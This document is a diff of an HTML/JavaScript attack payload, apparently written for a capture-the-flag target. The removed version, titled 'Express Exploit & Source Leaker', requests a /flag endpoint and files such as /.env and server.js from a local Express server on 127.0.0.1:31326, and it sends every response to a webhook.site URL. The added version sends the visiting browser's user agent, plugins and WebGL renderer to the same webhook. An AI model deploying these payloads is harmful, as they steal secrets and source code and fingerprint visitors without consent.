@@ -1,58 +1,19 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Express Exploit & Source Leaker</title>
-    <style>
-        body { font-family: monospace; padding: 10px; }
-        pre { background: #f4f4f4; padding: 10px; border: 1px solid #ccc; }
-    </style>
-</head>
-<body>
-    <h2>Express Route & Source Analysis</h2>
-    <div id="results"></div>
-
-    <script>
-        const webhook = 'https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427/';
-
-        // Helper to log and exfiltrate results
-        function logResult(title, data) {
-            const div = document.createElement('div');
-            div.innerHTML = `<h3>${title}</h3><pre>${escapeHtml(data)}</pre>`;
-            document.getElementById('results').appendChild(div);
-            
-            fetch(webhook + '?title=' + encodeURIComponent(title) + '&data=' + encodeURIComponent(data.substring(0, 1000)))
-                .catch(e => {});
-        }
-
-        function escapeHtml(text) {
-            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
-        }
-
-        // 1. Test POST request to /flag
-        fetch('http://127.0.0.1:31326/flag', { method: 'POST' })
-            .then(res => res.text())
-            .then(data => logResult('POST /flag Response', data))
-            .catch(err => logResult('POST /flag Error', err.toString()));
-
-        // 2. Try fetching common source code files / configs
-        const targets = [
-            '/package.json',
-            '/index.js',
-            '/server.js',
-            '/app.js',
-            '/src/index.js',
-            '/.env'
-        ];
-
-        targets.forEach(path => {
-            fetch('http://127.0.0.1:31326' + path)
-                .then(res => {
-                    if (res.ok) return res.text();
-                    throw new Error('Status: ' + res.status);
-                })
-                .then(data => logResult('File: ' + path, data))
-                .catch(err => {});
-        });
-    </script>
-</body>
-</html>
+<script>
+const webhook = 'https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427/';
+function report(title, data) {
+    fetch(webhook + '?title=' + encodeURIComponent(title) + '&data=' + encodeURIComponent(data))
+        .catch(e => {});
+}
+report('UserAgent', navigator.userAgent);
+report('AppVersion', navigator.appVersion);
+report('Vendor', navigator.vendor + ' / ' + navigator.vendorSub);
+report('Plugins', JSON.stringify([...navigator.plugins].map(p=>p.name)));
+report('WebGL', (() => {
+    try {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    } catch(e) { return 'n/a: ' + e; }
+})());
+</script>
